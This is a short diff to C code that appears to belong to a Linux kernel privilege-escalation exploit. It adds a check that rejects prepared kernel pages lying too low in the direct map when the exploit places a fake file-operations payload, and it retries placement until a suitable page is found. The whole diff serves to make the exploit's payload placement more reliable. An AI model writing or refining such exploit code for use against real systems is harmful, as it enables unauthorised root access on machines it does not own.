@@ -762,6 +762,30 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   return base;
 }
 
+static int kernel_page_candidate_ok(uintptr_t base, int payload_mode) {
+  if (!base) {
+    return 0;
+  }
+  if (payload_mode != PAGE_PAYLOAD_FOPS) {
+    return 1;
+  }
+
+  unsigned long min_delta =
+    env_ulong("FOPS_MIN_DIRECTMAP_DELTA", 0x08000000UL);
+  if (!min_delta || !is_direct_ptr(base)) {
+    return 1;
+  }
+
+  uintptr_t delta = base - DIRECT_MAP_BASE;
+  if (delta < (uintptr_t)min_delta) {
+    pr_warning("prepare_kernel_page rejected low direct-map page base=%016zx "
+               "delta=%016zx min=%08lx\n",
+               base, delta, min_delta);
+    return 0;
+  }
+  return 1;
+}
+
 uintptr_t prepare_good_kernel_page(int payload_mode) {
   int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
@@ -774,7 +798,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   deadline.tv_sec += 180;
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(payload_mode);
-    if (base) {
+    if (kernel_page_candidate_ok(base, payload_mode)) {
       pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
       return base;
     }
